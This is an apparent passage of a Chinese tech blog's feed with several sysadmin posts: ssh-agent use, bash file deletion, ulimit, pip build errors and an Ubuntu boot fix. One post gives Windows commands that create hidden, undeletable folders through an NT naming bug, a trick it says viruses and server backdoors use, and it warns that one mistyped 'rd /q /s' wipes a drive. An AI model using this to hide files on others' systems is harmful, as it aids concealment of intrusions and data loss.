&quot;\r&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">expect eof</span><br><span class="line"></span><br><span class="line">exit -onexit &#123;</span><br><span class="line">  send_user &quot;$user say good bye to you!\n&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种方式很方便，但是如果操作主机上没有口令短语的id_rsa文件被别人获得，你的服务器基本就是人家的了。所以使用口令短语对加强安全性来说是有必要的。我们把目标主机的 ~/.ssh/authorized_keys 移走，在操作主机上重新生成一对儿密钥，再ssh-copy-id到目标主机，ssh -p 22 sa@ip 连接的时候必须输入正确的口令短语才能登录目标主机。</p><p>在生产环境里，已经部署了不带口令短语的密钥，必须删除目标主机原有的公钥（保存在目标主机的~/.ssh/authorized_keys），删除操作主机旧的密钥并重新生成一套带口令的，再ssh-copy-id到目标主机。</p><h3 id="重点内容"><a href="#重点内容" class="headerlink" title="重点内容"></a>重点内容</h3><p>现在又一个问题来了，加了口令短语，私钥安全了，但是登录麻烦了，自动化运维也不可能了。怎么办？<br>我们可以用ssh-agent（ssh代理守护进程）。</p><p>启动代理守护进程：</p><pre><code>eval `ssh-agent`</code></pre><p>将私钥添加到代理守护进程：</p><pre><code>ssh-add</code></pre><p>列出代理守护进程保存的私钥：</p><pre><code>ssh-add -l</code></pre><p>删除代理守护进程保存的私钥：</p><pre><code>ssh-add -D</code></pre><h3 id="一个例子说说eval"><a href="#一个例子说说eval" class="headerlink" title="一个例子说说eval"></a>一个例子说说eval</h3><p>这个bash内部指令非常有意思，它是将后面的 `` 符号（键盘左上角跟～符一起的那个，不是单引号哈！）内的指令执行之后，把输出结果再执行一遍，比如上文的 </p><pre><code>eval `ssh-agent`</code></pre><p>先看看 ssh-agent 单独执行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@centos7-cn ~]# ssh-agent</span><br><span class="line">SSH_AUTH_SOCK=/tmp/ssh-CDZB3GtAT0MT/agent.11758; export SSH_AUTH_SOCK;</span><br><span class="line">SSH_AGENT_PID=11759; export SSH_AGENT_PID;</span><br><span class="line">echo Agent pid 11759;</span><br><span class="line">[root@centos7-cn ~]#</span><br></pre></td></tr></table></figure><pre><code>eval `ssh-agent` </code></pre><p>就是将ssh-agent的输出结果再执行一次，相当于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@centos7-cn ~]# SSH_AUTH_SOCK=/tmp/ssh-CDZB3GtAT0MT/agent.11758; export SSH_AUTH_SOCK;</span><br><span class="line">[root@centos7-cn ~]# SSH_AGENT_PID=11759; export SSH_AGENT_PID;</span><br><span class="line">[root@centos7-cn ~]# echo Agent pid 11759;</span><br></pre></td></tr></table></figure><p>所以 </p><pre><code>eval `ssh-agent`</code></pre><p>的执行结果就是：</p><p>后台运行ssh-agent，并且在当前会话输出两个环境变量SSH_AUTH_SOCK、SSH_AGENT_PID，然后再显示 Agent pid 11759 。</p><p>我们试一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@centos7-cn ~]# eval `ssh-agent`</span><br><span class="line">Agent pid 11877</span><br><span class="line">[root@centos7-cn ~]# echo $SSH_AUTH_SOCK</span><br><span class="line">/tmp/ssh-2Aq37RrIkeOH/agent.11876</span><br><span class="line">[root@centos7-cn ~]# echo $SSH_AGENT_PID</span><br><span class="line">11877</span><br><span class="line">[root@centos7-cn ~]#</span><br></pre></td></tr></table></figure><p>注意，这里得到的Pid跟单独执行的ssh-agent不同了，pgrep ssh-agent 会看到两个进程号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@centos7-cn ~]# pgrep ssh-agent</span><br><span class="line">11759</span><br><span class="line">11877</span><br><span class="line">[root@centos7-cn ~]#</span><br></pre></td></tr></table></figure><p>还要注意，退出当前会话并不会杀死ssh-agent进程。手工杀死进程除了上述的 pgrep 指令，还有ssh-agent -k 可以。试试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@centos7-cn ~]# ssh-agent</span><br><span class="line">SSH_AUTH_SOCK=/tmp/ssh-gm8UdqqlTXeb/agent.14140; export SSH_AUTH_SOCK;</span><br><span class="line">SSH_AGENT_PID=14141; export SSH_AGENT_PID;</span><br><span class="line">echo Agent pid 14141;</span><br><span class="line">[root@centos7-cn ~]#</span><br><span class="line">[root@centos7-cn ~]# ssh-agent -k</span><br><span class="line">SSH_AGENT_PID not set, cannot kill agent</span><br></pre></td></tr></table></figure><p>找不到SSH_AGENT_PID环境变量，这个指令选项无效。那么手工输出一下吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@centos7-cn ~]#</span><br><span class="line">[root@centos7-cn ~]# SSH_AGENT_PID=14141; export SSH_AGENT_PID;</span><br><span class="line">[root@centos7-cn ~]#</span><br><span class="line">[root@centos7-cn ~]# ssh-agent -k</span><br><span class="line">unset SSH_AUTH_SOCK;</span><br><span class="line">unset SSH_AGENT_PID;</span><br><span class="line">echo Agent pid 14141 killed;</span><br><span class="line">[root@centos7-cn ~]#</span><br></pre></td></tr></table></figure><p>这回可以了。所以 ssh-agent 命令最好还是用 </p><pre><code>eval `ssh-agent` </code></pre><p>执行更方便，但是要记住不能重复执行，ssh-agent -k 只负责最后一个进程，道理呢？参考ssh-agent -k指令输出，自己琢磨一下吧。</p><p><a href="http://www.cnblogs.com/panblack/p/Secure_ssh_trust_connection.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">参考链接</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;一般情况这样玩&quot;&gt;&lt;a href=&quot;#一般情况这样玩&quot; class=&quot;headerlink&quot; title=&quot;一般情况这样玩&quot;&gt;&lt;/a&gt;一般情况这样玩&lt;/h3&gt;&lt;p&gt;为了方便系统管理或者服务器运维自动化，我们通常要在服务器间做ssh无密码信任连接。&lt;/p&gt;
+&lt;p&gt;在服务器端创建密钥&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ssh-keygen -t dsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;一路回车，在~/.ssh下生成的id_rsa是私钥，id_rsa.pub是公钥。复制公钥到目标服务器，然后就可以无密码登录了：&lt;/p&gt;
+&lt;p&gt;自动化拷贝公钥到多台目标机器&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://jetwang99.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows 畸形文件夹</title>
+    <link href="http://jetwang99.github.io/2016/06/03/windows-malformation-folder/"/>
+    <id>http://jetwang99.github.io/2016/06/03/windows-malformation-folder/</id>
+    <published>2016-06-03T03:44:38.000Z</published>
+    <updated>2018-01-24T08:30:24.816Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="一、如何让一个文件夹无法删除，甚至无法打开？"><a href="#一、如何让一个文件夹无法删除，甚至无法打开？" class="headerlink" title="一、如何让一个文件夹无法删除，甚至无法打开？"></a>一、如何让一个文件夹无法删除，甚至无法打开？</h3><p>以建一个”abc.”文件夹为例（注意文件名中的点，正常情况下你是无法创建一个带点的文件名的文件夹的）： </p><p>1、进入命令提示符，将当前工作目录切换到D盘，输入： </p><p>D: </p><p>回车，然后下输入： </p><p>md abc..\ </p><p>回车。 </p><a id="more"></a><p>2、你就会发现建成了一个”abc.”的文件夹。 </p><p>3、这个文件夹双击打不开也删不掉，同时普通模式下也删不掉。 </p><p>4、那如何放文件进去呢？可以用COPY命令复制文件进去： copy 文件名 d:/abd../ </p><p>5、那如何打开这个文件夹呢？在”运行”中输入完整的路径和文件夹的名称就行了，如：D:\abc..\ </p><p>6、那如何删除呢？命令行下，将当前工作目录切换到D盘，并输入： </p><p>rd /q /s abc..\ </p><p>原理：用了windows的非法命名好处，这个是windows NT系列系统的bug，在dos或者win9x下就可以正常访问NT系统创建的这种文件夹，但不能创建此类文件夹。如果分区是NTFS格式，9X就无能为力了。病毒利用这个bug进行破坏，ghost工具则利用这个bug进行备份gho文件，非常了不起的是：ghost.exe在DOS下能发现这样的文件夹——兼容window NT的这个bug。 </p><h3 id="二、再有一种文件夹是可以正常打开但不能删的："><a href="#二、再有一种文件夹是可以正常打开但不能删的：" class="headerlink" title="二、再有一种文件夹是可以正常打开但不能删的："></a>二、再有一种文件夹是可以正常打开但不能删的：</h3><p>创建命令： </p><p>md “D:/abc / “ </p><p>删除命令： </p><p>rd /q /s “D:/abc / “ </p><p>注意：引号最好要有，还有空格，如：”D:/abc空格/空格” 。 </p><h3 id="三、再来个看不见的："><a href="#三、再来个看不见的：" class="headerlink" title="三、再来个看不见的："></a>三、再来个看不见的：</h3><p>创建命令： </p><p>md D:/…/ </p><p>删除命令： </p><p>rd /q /s D:/…/ </p><p>注意：这个文件夹在资源管理器里是看不见的，但命令提示符能看见。打开方式：运行（win+r）下输入D:/…/ </p><p>注意：使用 rd /s /q D:/…/ 命令时，少个 . 会把D盘所有文件都删除了！输入命令时要小心谨慎呀！ </p><h3 id="四、另一种可以正常打开不能通过资源管理器删除的："><a href="#四、另一种可以正常打开不能通过资源管理器删除的：" class="headerlink" title="四、另一种可以正常打开不能通过资源管理器删除的："></a>四、另一种可以正常打开不能通过资源管理器删除的：</h3><p>创建命令： </p><p>md “D:/ / “ </p><p>删除命令： </p><p>rd /q /s “D:/ / “ </p><p>注意：引号最好要有，还有空格，如：”D:/空格/空格” 。 </p><h3 id="五、补充说明："><a href="#五、补充说明：" class="headerlink" title="五、补充说明："></a>五、补充说明：</h3><p>1、如果你 md abc../ 建个 abc. 这样的非法文件夹。 再在资源管理器中建个abc的文件夹。原来的 abc. 就可以打开。不过看不到里面的文件。而且可以删除 abc. 文件夹。不过删了 abc. 文件夹的话。里面原来的文件会跑到后面建的 abc 文件夹里去。这个 abc 文件夹也会变得无法删除并且无法打开。 但如果在”运行”下输入 D:/abc../ 的话，还是可以看到里面的文件的。 abc. 文件夹和 abc 文件夹同时存在的时候,可以给 abc. 文件夹改名成abc文件夹。这时就同时存在两个 abc 文件夹。但如果你删除其中的一个文件夹,刷新后，还是会返回成 abc. 文件夹。在xp的命令行可以轻松建立这样删不掉的文件夹，可是在纯dos下却不行！ </p><p>2、建一个不带”.” 与带”.” 的”bug文件夹”： </p><p>（1）建立一个带”.”文件夹，如： </p><p>md abc../ </p><p>（2）建立一个普通文件夹abc </p><p>（3）普通方法删除带点的文件夹 </p><p>（4）后面留下的abc文件夹也是普通方法打不开,删不掉,同原 abc. 文件一样用,就是名称上看起来没”.” </p><p>3、再来伪装”bug文件夹”： </p><p>（ 1）建abc.文件夹 </p><p>（2）copy命令复制文件进abc.文件夹 </p><p>（3）普通建abc文件夹 </p><p>（4）此时可以打开abc.与abc，且两文件夹似乎使用的是同样的磁盘空间，普通方法复制进其中一个文件夹，另一个文件夹会有同样的文件出现。但是在第2步中copy进文件夹的文件不会显示。 </p><p>（ 5）两个文件都可以用普通方法删除，但是不管是删除哪个(abc.或是abc)，剩下的那个文件夹(abc或是abc.)与第1步中建立的abc.具有相同功能，普通方法不能打开，不能删除。 </p><p>所以，可以建立名称如同普通文件夹一样的”bug文件夹”（只是名称看起来一样而已），可以把一些想保护起来的文件放到里面，免于误删，被该等问题。 </p><h3 id="六、一些有意思的现象："><a href="#六、一些有意思的现象：" class="headerlink" title="六、一些有意思的现象："></a>六、一些有意思的现象：</h3><p>1、如果把文件拖到这个abc.文件夹里。那么，他马上会生成个abc（同名文件夹），并且拖进去的文件可见，但是见不到之前用在运行下输入 D:/abc../ 复制进去的文件。并且，如果在拖进文件之后用在运行下输入 D:/abc../ 进去看。是看不到拖进去的文件的。把这两个同名的文件夹删掉其中之一后，用在运行下输入 D:/abc../ 进去看，还是看不到拖进去的文件。 </p><p>2、我们可以先建立一个如abc的文件夹，再把其设为隐藏属性，然后再利用winrar这个软件来对其文件夹命名为abc../ 。至此大功告成，其文件夹达到一般不可删除，隐藏的的功能。再把文件夹选项设为不显示隐藏文件。 </p><p>3、现在只是在windows 2000里运行里用 abc../ 进入不了文件夹，在xp里就可以进入。 </p><p>4、在NTFS分区下，资源管理器看不见的这个目录。分区必须是FAT32格式，NTFS是无法建立的。 </p><p>5、其实分区里面abc.文件是可以删除的，注意是文件不是文件夹。方法如下： 用 dir/x 命令来获取畸形文件的短文件名，再用del命令来删除。</p><h3 id="七、特别需要注意的情况"><a href="#七、特别需要注意的情况" class="headerlink" title="七、特别需要注意的情况"></a>七、特别需要注意的情况</h3><p>部分网站服务器目录中出现了大量的畸形文件夹，那么就需要注意了，这是黑客留的后门程序都在里面了，一定要删除了，如果手工删除少了还可以，如果几千了文件，就需要用批量删除程序了</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;一、如何让一个文件夹无法删除，甚至无法打开？&quot;&gt;&lt;a href=&quot;#一、如何让一个文件夹无法删除，甚至无法打开？&quot; class=&quot;headerlink&quot; title=&quot;一、如何让一个文件夹无法删除，甚至无法打开？&quot;&gt;&lt;/a&gt;一、如何让一个文件夹无法删除，甚至无法打开？&lt;/h3&gt;&lt;p&gt;以建一个”abc.”文件夹为例（注意文件名中的点，正常情况下你是无法创建一个带点的文件名的文件夹的）： &lt;/p&gt;
+&lt;p&gt;1、进入命令提示符，将当前工作目录切换到D盘，输入： &lt;/p&gt;
+&lt;p&gt;D: &lt;/p&gt;
+&lt;p&gt;回车，然后下输入： &lt;/p&gt;
+&lt;p&gt;md abc..\ &lt;/p&gt;
+&lt;p&gt;回车。 &lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Windows" scheme="http://jetwang99.github.io/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>在 Bash 中删除除某些文件外的所有文件</title>
+    <link href="http://jetwang99.github.io/2016/05/19/exclude-file-when-using-rm/"/>
+    <id>http://jetwang99.github.io/2016/05/19/exclude-file-when-using-rm/</id>
+    <published>2016-05-19T07:52:08.000Z</published>
+    <updated>2018-01-24T08:30:24.790Z</updated>
+    
+    <content type="html"><![CDATA[<p>我的一位同事曾经问过我这样一个问题：在 Linux 下，如何 删除目录中除某些文件之外的所有文件？当时，我告诉他可 以通过模式匹配的方法解决。但其实，除此之外，还有其他 的方法，正所谓“条条大路通罗马”。让我们来逐一看看。</p><p>假设要删除 ~/Downloads 目录中除 <em>.iso 和 </em>.zip 外的 所有文件，那么在 bash 中可以按以下方法处理。</p><h3 id="模式匹配法"><a href="#模式匹配法" class="headerlink" title="模式匹配法"></a>模式匹配法</h3><pre><code>shopt -s extglob # 确认开启 extglob 选项cd ~/Downloadsrm -v !(*.iso|*.zip)!(pattern list) 的作用是匹配除 pattern list 之外 的文件。</code></pre><a id="more"></a><h3 id="设置变量法"><a href="#设置变量法" class="headerlink" title="设置变量法"></a>设置变量法</h3><p>在 bash 中，GLOBIGNORE 可用来设置要忽略的模式匹配 文件，多个模式通过 : 分隔。</p><pre><code>cd ~/Downloadsexport GLOBIGNORE=*.zip:*.isorm -v *unset GLOBIGNORE</code></pre><h3 id="find-搜索法"><a href="#find-搜索法" class="headerlink" title="find 搜索法"></a>find 搜索法</h3><p>熟悉 find 的朋友想必知道，find 的威力异常强大，因此 利用它也可解决此问题。</p><pre><code>cd ~/Downloadsfind . -type f -not \( -name &apos;*.zip&apos; -or -name &apos;*.iso&apos; \) -delete</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;我的一位同事曾经问过我这样一个问题：在 Linux 下，如何 删除目录中除某些文件之外的所有文件？当时，我告诉他可 以通过模式匹配的方法解决。但其实，除此之外，还有其他 的方法，正所谓“条条大路通罗马”。让我们来逐一看看。&lt;/p&gt;
+&lt;p&gt;假设要删除 ~/Downloads 目录中除 &lt;em&gt;.iso 和 &lt;/em&gt;.zip 外的 所有文件，那么在 bash 中可以按以下方法处理。&lt;/p&gt;
+&lt;h3 id=&quot;模式匹配法&quot;&gt;&lt;a href=&quot;#模式匹配法&quot; class=&quot;headerlink&quot; title=&quot;模式匹配法&quot;&gt;&lt;/a&gt;模式匹配法&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;shopt -s extglob # 确认开启 extglob 选项
+cd ~/Downloads
+rm -v !(*.iso|*.zip)
+!(pattern list) 的作用是匹配除 pattern list 之外 的文件。
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://jetwang99.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>正确配置Linux系统ulimit/nproc值的方法（转）</title>
+    <link href="http://jetwang99.github.io/2016/04/29/linux-ulimit-nproc-set/"/>
+    <id>http://jetwang99.github.io/2016/04/29/linux-ulimit-nproc-set/</id>
+    <published>2016-04-29T09:47:34.000Z</published>
+    <updated>2018-01-24T08:30:24.802Z</updated>
+    
+    <content type="html"><![CDATA[<p>在Linux下面部署应用的时候，有时候会遇上Socket/File: Can’t open so many files的问题；这个值也会影响服务器的最大并发数，其实Linux是有文件句柄限制的，而且Linux默认不是很高，一般都是1024，生产服务器用其实很容易就达到这个数量。下面说的是，如何通过正解配置来改正这个系统默认值。</p><p>查看方法</p><p>我们可以用ulimit -a来查看所有限制值</p><a id="more"></a><p>[root@centos5 ~]# ulimit -a<br>core file size          (blocks, -c) 0<br>data seg size           (kbytes, -d) unlimited<br>scheduling priority             (-e) 0<br>file size               (blocks, -f) unlimited<br>pending signals                 (-i) 31365<br>max locked memory       (kbytes, -l) 64<br>max memory size         (kbytes, -m) unlimited<br>open files                      (-n) 1024<br>pipe size            (512 bytes, -p) 8<br>POSIX message queues     (bytes, -q) 819200<br>real-time priority              (-r) 0<br>stack size              (kbytes, -s) 10240<br>cpu time               (seconds, -t) unlimited<br>max user processes              (-u) 31365<br>virtual memory          (kbytes, -v) unlimited<br>file locks                      (-x) unlimited</p><!--more--> <p>其中 “open files (-n) 1024 “是Linux操作系统对一个进程打开的文件句柄数量的限制</p><p>(也包含打开的SOCKET数量，可影响MySQL的并发连接数目)。</p><p>正确的做法，应该是修改/etc/security/limits.conf<br>里面有很详细的注释，比如</p><p>hadoop soft nofile 32768<br>hadoop hard nofile 65536</p><p>hadoop soft nproc 32768<br>hadoop hard nproc 65536</p><p>就可以将文件句柄限制统一改成软32768，硬65536。配置文件最前面的是指domain，设置为星号代表全局，另外你也可以针对不同的用户做出不同的限制。</p><p>注意：这个当中的硬限制是实际的限制，而软限制，是warnning限制，只会做出warning；其实ulimit命令本身就有分软硬设置，加-H就是硬，加-S就是软<br>默认显示的是软限制，如果运行ulimit命令修改的时候没有加上的话，就是两个参数一起改变。</p><p>RHE6及以后 nproc的修改在/etc/security/limits.d/90-nproc.conf中</p><p>生效</p><p>因为我平时工作最多的是部署web环境(Nginx+FastCGI外网生产环境和内网开发环境)，重新登陆即可(reboot其实也行)我分别用root和www用户登陆，用ulimit -a分别查看确认，做这之前最好是重启下ssh服务，service sshd restart。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在Linux下面部署应用的时候，有时候会遇上Socket/File: Can’t open so many files的问题；这个值也会影响服务器的最大并发数，其实Linux是有文件句柄限制的，而且Linux默认不是很高，一般都是1024，生产服务器用其实很容易就达到这个数量。下面说的是，如何通过正解配置来改正这个系统默认值。&lt;/p&gt;
+&lt;p&gt;查看方法&lt;/p&gt;
+&lt;p&gt;我们可以用ulimit -a来查看所有限制值&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://jetwang99.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>pip install 的报错 Unable to find vcvarsall.bat</title>
+    <link href="http://jetwang99.github.io/2016/03/23/pip-install-unable-to-find-vcvarsallbat/"/>
+    <id>http://jetwang99.github.io/2016/03/23/pip-install-unable-to-find-vcvarsallbat/</id>
+    <published>2016-03-23T05:03:03.000Z</published>
+    <updated>2018-01-24T08:30:24.806Z</updated>
+    
+    <content type="html"><![CDATA[<p>Python 2.7 会搜索 Visual Studio 2008.<br>如果你电脑上没有这个版本的话,比如只有:</p><ol><li>Visual Studio 2010,在cmd里面执行:</li></ol><p>SET VS90COMNTOOLS=%VS100COMNTOOLS%</p><ol><li>Visual Studio 2012 的话:</li></ol><p>SET VS90COMNTOOLS=%VS110COMNTOOLS%</p><p>其他版本的VS依此类推</p><a id="more"></a><p>解决了上面的问题，执行pip install 的时候有时候还会报错：</p><p>general error c1010070: Failed to load and parse the manifest. The system cannot find the file specified.<br>error: command ‘mt.exe’ failed with exit status 31</p><p>解决办法：由于vs201x的link.exe的参数稍微有些改变，所以在link的时候没有生成manifest文件，自然mt.exe找不到这个文件。只需要在msvc9compiler.py里面搜索一下MANIFESTFILE，然后在他上面加一行</p><p>ld_args.append(‘/MANIFEST’)</p><p>保存就OK了。</p><p>补充:<br>如果是用的64位的python，那么链接的时候会用到64位的lib库，所以还得把开发包中Lib目录中的x64目录里面的两个lib文件放到vc的lib目录中的amd64目录中。比如对于visual studio 2012就放在C:\Program Files (x86)\Microsoft Visual Studio 11.0\VC\lib\amd64\</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Python 2.7 会搜索 Visual Studio 2008.&lt;br&gt;如果你电脑上没有这个版本的话,比如只有:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Visual Studio 2010,在cmd里面执行:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;SET VS90COMNTOOLS=%VS100COMNTOOLS%&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Visual Studio 2012 的话:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;SET VS90COMNTOOLS=%VS110COMNTOOLS%&lt;/p&gt;
+&lt;p&gt;其他版本的VS依此类推&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Python" scheme="http://jetwang99.github.io/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux noclobber</title>
+    <link href="http://jetwang99.github.io/2016/03/22/linux-noclobber/"/>
+    <id>http://jetwang99.github.io/2016/03/22/linux-noclobber/</id>
+    <published>2016-03-21T22:16:16.000Z</published>
+    <updated>2018-01-24T08:30:24.799Z</updated>
+    
+    <content type="html"><![CDATA[<p>来源：CU之Shell十三问</p><p>CODE:<br>$ set -o noclobber<br>$ echo “4” &gt; file.out<br>-bash: file: cannot overwrite existing file</p><p>那，要如何取消这个”限制”呢？<br>哦，将 set -o 换成set +o 就行：<br><a id="more"></a><br>CODE:<br>$ set +o noclobber<br>$ echo “5” &gt; file.out<br>$ cat file.out</p><p>再问：那… 有办法不取消而又”临时”盖写目标档案吗？<br>哦，佛曰：不可告也﹗<br>啊<del>~ 开玩笑的、开玩笑的啦</del>~ ^_^ 唉，早就料到人心是不足的了﹗</p><p>CODE:<br>$ set -o noclobber<br>$ echo “6” &gt;| file.out<br>$ cat file.out</p><p>留意到没有：在 &gt; 后面再加个” | “就好(注意： &gt; 与 | 之间不能有空白哦)….</p><p>突然感觉不知道的东西还是太多</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;来源：CU之Shell十三问&lt;/p&gt;
+&lt;p&gt;CODE:&lt;br&gt;$ set -o noclobber&lt;br&gt;$ echo “4” &amp;gt; file.out&lt;br&gt;-bash: file: cannot overwrite existing file&lt;/p&gt;
+&lt;p&gt;那，要如何取消这个”限制”呢？&lt;br&gt;哦，将 set -o 换成set +o 就行：&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Linux" scheme="http://jetwang99.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>双系统进Ubuntu开机卡死</title>
+    <link href="http://jetwang99.github.io/2016/01/13/ubuntu-hang-on-boot/"/>
+    <id>http://jetwang99.github.io/2016/01/13/ubuntu-hang-on-boot/</id>
+    <published>2016-01-13T04:02:02.000Z</published>
+    <updated>2018-01-24T08:30:24.812Z</updated>
+    
+    <content type="html"><![CDATA[<p>公司淘汰的DELL OPTIPLEX780自从带回家装机之后一直焕发着第二春。不过自打安装了双系统之后就小毛病不断，这次又进不去ubuntu的X了，虽说被无数次折磨过，不过实在不想再像以前那样直接重装ubuntu了，于是开始Google咯，直到问题解决，现在记录一下问题作为备忘。</p><p>先说系统环境</p><p>软件：</p><p>Window 10 + Ubuntu 15.10</p><p>➜  ~  lsb_release -a<br>No LSB modules are available.<br>Distributor ID:    Ubuntu<br>Description:    Ubuntu 15.10<br>Release:    15.10<br>Codename:    wily</p><a id="more"></a><p>硬件：</p><p>硬盘：Samsung SSD 850 EVO 120GB（操作系统盘） + 希捷（Seagate）ST1000DM003-1ER162 (CC45)<br>CPU：Intel® Core™2 Duo CPU E7500 @ 2.93GHz × 2<br>显卡：Intel® Q45/Q43</p><p>默认启动项Systemd，进不了X，查看启动项内容如下：(libata.force=noncq是Google之后自己加的，关键词: EVO 850 linux kernel ncq bug，参考链接：<a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/550559" target="_blank" rel="noopener">hdd problems, failed command: READ FPDMA QUEUED</a>)</p><pre><code>menuentry &apos;Ubuntu&apos; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &apos;gnulinux-simple-211dc254-7fee-4d5b-a9c7-01980b270596&apos; {recordfailload_videogfxmode $linux_gfx_modeinsmod gzioif [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fiinsmod part_msdosinsmod xfsset root=&apos;hd0,msdos7&apos;if [ x$feature_platform_search_hint = xy ]; thensearch --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos7 --hint-efi=hd0,msdos7 --hint-baremetal=ahci0,msdos7  211dc254-7fee-4d5b-a9c7-01980b270596elsesearch --no-floppy --fs-uuid --set=root 211dc254-7fee-4d5b-a9c7-01980b270596filinux    /boot/vmlinuz-4.2.0-23-generic root=UUID=211dc254-7fee-4d5b-a9c7-01980b270596 ro libata.force=noncq quiet splash $vt_handoffinitrd    /boot/initrd.img-4.2.0-23-generic}</code></pre><p>第二启动项upstart进入X桌面环境没有问题</p><p>linux    /boot/vmlinuz-4.2.0-23-generic root=UUID=211dc254-7fee-4d5b-a9c7-01980b270596 ro libata.force=noncq quiet splash $vt_handoff init=/sbin/upstart</p><p>翻来覆去找谷歌，终于看到某位大神在一个帖子里不经意的一句，算是功夫不负有心人</p><p><a href="http://ubuntuforums.org/showthread.php?t=2284315" target="_blank" rel="noopener">Thread: Ubuntu Installation Freezes Randomly on MSI GE72 2QF Apache Pro 2</a></p><p>这句话要记下来（第二句咯）：</p><ol><li>You HAVE to install ubuntu 15.04 64bit. Any other version simply does not work. Some people also reported that 14.04.3 64bit works too.</li><li>In the BIOS you have to disable the following: FastBoot, Intel Speedstep, SecureBoot</li><li>In the BIOS make sure that UEFI is enabled with CSM</li><li>When starting the Ubuntu installation you have to add the kernel option “libata.force=noncq”. This is a MUST!</li><li>After the installation do a full update on Ubuntu. Then you can remove the kernel option “libata.force=noncq”. Your SSD should perform faster now. But SpeedStep is still a problem. I have to keep it off.</li><li>I even re-enabled Fastboot and Secure in the BIOS and it still runs fine.</li></ol><p>于是，重启进BIOS，把FastBoot禁用了，然后按顺序操作，一切完好如初。。。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;公司淘汰的DELL OPTIPLEX780自从带回家装机之后一直焕发着第二春。不过自打安装了双系统之后就小毛病不断，这次又进不去ubuntu的X了，虽说被无数次折磨过，不过实在不想再像以前那样直接重装ubuntu了，于是开始Google咯，直到问题解决，现在记录一下问题作为备忘。&lt;/p&gt;
+&lt;p&gt;先说系统环境&lt;/p&gt;
+&lt;p&gt;软件：&lt;/p&gt;
+&lt;p&gt;Window 10 + Ubuntu 15.10&lt;/p&gt;
